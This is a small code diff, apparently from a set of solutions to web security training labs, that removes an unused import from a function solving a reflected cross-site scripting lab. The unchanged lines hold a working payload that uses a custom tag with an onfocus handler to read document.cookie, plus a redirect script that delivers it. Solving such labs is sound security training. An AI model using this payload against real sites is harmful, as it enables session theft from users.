@@ -1,6 +1,3 @@
-from web_security_academy.core.logger import logger
-
-
 def solve_lab(session):
     xss = "<xss id=x onfocus=alert(document.cookie) tabindex=1>"
     script = f"""<script>document.location = "{session.url}?search={xss}#x"</script>"""
